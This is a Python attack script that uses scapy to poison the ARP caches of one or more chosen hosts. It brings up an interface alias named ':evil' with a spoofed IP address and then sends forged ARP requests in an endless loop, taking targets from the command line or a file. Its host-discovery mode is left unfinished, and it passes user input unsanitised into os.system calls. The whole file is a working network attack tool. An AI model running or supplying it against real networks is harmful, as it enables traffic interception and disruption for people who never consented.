# IMPORTS
import argparse
import subprocess
import signal
import sys
import apt
import os
from scapy.all import srp, Ether, ARP
from time import sleep

# CREATE PARSER
parser = argparse.ArgumentParser()

# ADD REQUIRED ARGUMENTS
parser.add_argument("ip_addr", help="The IPv4 address you with to spoof")
parser.add_argument("iface", help="The network interface to use")
# ADD OPTIONAL ARGUMENTS
parser.add_argument("--timeout", help="Specify an timeout in seconds between malicious ARP queries. Default: 60 ")
parser.add_argument("--targets", help="Used with MULTI mode to specify a target file, or specify DISCOVER to discover and target all hosts on the subnet")
parser.add_argument("--target", help="Used with SINGLE mode to specify the IP address of a single host to poison the cache of.")

# PARSE ARGUMENTS
args = parser.parse_args()

IP = args.ip_addr
IFACE = args.iface

timeout = args.timeout
if not timeout:
    timeout = 60
target = args.target
targets = args.targets

# ENSURE THAT UTILITIES WE NEED ARE INSTALLED
print("[+] Checking dependencies...")

# IF DOTFILE HAS BEEN WRITTEN BY PREVIOUS CHECK
if os.path.exists('.dependencies_met'):
    print("[+] Dependencies met!")

else:
    cache = apt.Cache()
    cache.open()
    if not cache["net-tools"].is_installed:
        print("[!] Please install the 'net-tools' package with 'sudo apt install arping'!")
        print("[!] Quitting...")
        quit()
    with open(".dependencies_met", 'w') as f:
        f.write("do not remove me, this file confirms that dependencies have been met")
    print("[+] Dependencies met!")

# CREATE A LISTENER FOR SIGTERM TO DO CLEANUP
# DO CLEAN UP
def sigterm_handler(_signo, _stack_frame):
    print(f'\n\n')
    print(f'[+] Cleaning up aliased interface...')
    os.system(f'ifconfig {IFACE}:evil down')
    print(f'[+] Interface cleanup completed')
    quit()

# SET LISTENERS
signal.signal(signal.SIGTERM, sigterm_handler)
signal.signal(signal.SIGINT, sigterm_handler)


# DETERMINE TARGETS
targetArr = []
fname = None
if not targets and not target:
    print(f'[!] WARNING: you must specify target/s with the --target or --targets options')
if target:
    print(f'[+] Launching in SINGLE mode')
    print(f'[+] Target:\t\t{target}')
    targetArr.append(target)
else:
    print(f'[+] Launching in MULTI mode')

    # IF USING TARGET DISCOVERY MODE
    if targets == "DISCOVER":
        print(f'[+] Discovering targets...')
        
        # TODO: use IP SWEEP PROGRAM TO GENERATE A LIST OF IP ADDRESSES

    # IF USING A TARGET FILE
    else:
        fname = targets

        # TODO: OPEN A FILE!
        if not os.path.exists(fname):
            print(f'[!] WARNING: target file not found. ')
            print(f'[!] Quitting...')
            quit()
        else:
            print(f'[+] Opening targets file')
            with open(fname, "r") as targetFile:
                targetArr = targetFile.readlines()
                targetArr = [t.strip() for t in targetArr]
            print(f'[+] Identified targets:')
            for t in targetArr:
                print(f'\t[+] {t}')



# ALIAS THE INTERFACE
print(f'[+] Aliasing interface {IFACE} to {IFACE}:evil with Spoofed IP address {IP}')
os.system(f'ifconfig {IFACE}:evil {IP} up')

# SEND SPOOFS
print(f'[+] Beginning Spoofing:\n')
while (True):
    for target in targetArr:
        print(f'[+] Sending ARP request to {target}')
        # CREATE AN ARP PACKET
        # DST: DESTINATION = BROADCAST
        # PDST: PACKET DESTINATION = TARGET
        # PSRC: PACKET SOURCE = SPOOFED IP ADDRESS
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target, psrc=IP), timeout=3)
        if ans:
            print(f'[+] Received response from {target}\n')
    sleep(timeout)
